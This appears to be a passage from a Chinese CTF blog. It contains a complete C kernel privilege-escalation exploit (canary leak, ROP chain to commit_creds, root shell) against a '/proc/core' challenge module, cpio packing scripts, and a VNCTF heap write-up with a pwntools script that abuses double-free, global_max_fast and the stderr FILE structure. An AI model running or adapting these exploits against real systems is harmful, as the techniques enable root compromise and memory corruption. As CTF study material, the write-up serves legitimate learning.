<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege_escalation</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">        (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))(</span><br><span class="line">            (*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] =(<span class="keyword">size_t</span>)privilege_escalation;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里记录一下自己写的打包和解包的shell脚本</p>
<p>解包 命令行第一个参数是相对于rootfs文件夹cpio的相对路径，第二个参数是在rootfs文件中储存cpio文件的文件名，注意如果cpio文件是压缩包形式，那先解压缩，然后再执行shell脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">mv $1 $2</span><br><span class="line">cpio -idmv &lt; $2</span><br><span class="line">mv $2 $1</span><br></pre></td></tr></table></figure>

<p>打包 第一个参数是储存cpio文件相对路径。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; $1</span><br></pre></td></tr></table></figure>

<p>一般情况下挺好用的，但有时候题目会给打包和解包文件，注意使用题目给的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/07/VNCTF-pwn1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/07/VNCTF-pwn1/" class="post-title-link" itemprop="url">VNCTF pwn1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-07 22:24:19 / 修改时间：22:57:56" itemprop="dateCreated datePublished" datetime="2022-03-07T22:24:19+08:00">2022-03-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="VNCTF-pwn1"><a href="#VNCTF-pwn1" class="headerlink" title="VNCTF pwn1"></a>VNCTF pwn1</h1><p>这道题鸽了有半个多月了，终于把他做完了，当时是全场零解的题，看官方wp的时候有200多行的代码，看得我头皮发麻，幸好后面找见了个比较简单的wp，但这个wp就是简略的说了一下过程，还有我没有见过的stderr利用（不懂为什么不可以使用stdout），后面实验一下</p>
<p>这道题的代码量挺少的，主要逻辑是两个数组储存对的地址和堆的大小，在申请的时候会对size数组遍历检查，如果为0在此处储存新堆块的大小，对应地址数组的偏移储存地址，在free的时候不会检查地址数组，只检查size数组，然后free完不会清除地址，只清除size,导致可以doublefree,如果申请的时候idx是指定的就很方便了，但是这个不是指定的，而是遍历size数组的，况且是2.31的glibc，单纯doublefree是不行的，我们得通过doublefree构造UAF，通过doublefree构造UAF的方式先free一次，在申请出来，然后再free一次，这样就构成了UAF，为了不覆盖堆地址，所以需要doublefree的idx在后面才行（当时没想到，笨）。</p>
<p>我感觉这道题的精华就是把一个堆同时放到tcache和unsortedbin上面，这样tcache的fd就有了libc地址了，然后使用UAF进行爆破（有leak就不用这么麻烦了）。</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>先在flag附近申请一个指定的堆块，然后利用UAF打global_max_fast,然后把这个堆块free到stderr的write_base上面，再利用UAF打stderr，修改flag和write_base的最后一个字节，至于为什么要改，因为这个堆的地址大于储存flag的地址，所以得改小，最后修改topchunk的size的大小和prev_size(0),最后申请一个大堆块，就会触发io_new_file_xsputn,这个函数在stdout就介绍过了，里面有一个sys_write()函数，只要file结构体的flag满足条件就行，这样就有了io函数了，就能输出flag值了。</p>
<p>这是我写的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,context</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x14b0</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x40</span>)<span class="comment">#1-7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x50</span>)<span class="comment">#8-14</span></span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x120</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#18</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">15</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#1-&gt;15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">15</span>)</span><br><span class="line">        edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#fast-&gt;0x1eeb80     stderr-&gt;0x1ec5c0   </span></span><br><span class="line">    add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#3</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x80\xcb&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#5-&gt;16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">16</span>)</span><br><span class="line">        edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#7</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;\xc0\xa5&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#8</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)<span class="comment">#10</span></span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x430</span>+p64(<span class="number">0</span>)+p64(<span class="number">123</span>))</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#11</span></span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x7fffffffffff</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#0</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x80</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x888</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>感觉对其中的调用链很模糊，再研究研究</p>
<h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h2><p>之前能使用stdout进行leak最主要的原因是puts函数调用了<code>_IO_file_xsputn</code>函数，而<code>_IO_file_xsputn</code>函数会最终会调用<code>io_overflow</code>函数，<code>io_overflow</code>函数最后又会调用<code>io_do_write</code>函数，<code>io_do_write</code>函数又会调用<code>new_do_write</code></p>
<p>注意上面的调用链是一定的，调用<code>_IO_file_xsputn</code>函数以后最后一定会调用<code>new_do_write</code>函数，而<code>new_do_wirte</code>函数就是我们要利用的地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">//最终输出 </span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意有个write的系统调用，把data输出到fp，fp如果是stdout或者是stderr，那就相当于把data输出到屏幕，之前对flag的设置就是为了<code>new_do_write</code>函数能走到<code>_IO_SYSWRITE (fp, data, to_do)</code></p>
<p>这道题之所以不能用stdout是因为输出函数是write函数，没有调用<code>_IO_file_xsputn</code>函数</p>
<h2 id="stderr"><a href="#stderr" class="headerlink" title="stderr"></a>stderr</h2><p>经过gdb的调试我找见了脚本最后的调用链<code>malloc-&gt;_int_malloc-&gt;sysmalloc-&gt;__malloc_assert-&gt;__fxprintf-&gt;buffered_vfprintf-&gt;_IO_file_xsputn</code>,这就和上面的stdout泄露的调用链连上了，虽然找见了调用链但是过程不是很清晰，和houseofkiwi扯上关系了，以后再学习叭，现在夜深了。</p>
<p>我找见了进入<code>__malloc_assert</code>函数的源码,其中刷新stderr是利用的<code>__fxprintf</code>,<code>house of kiwi</code>使用的是<code>fflush(stderr)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __assert_fail(assertion, file, <span class="meta-keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="meta-keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">		 <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; 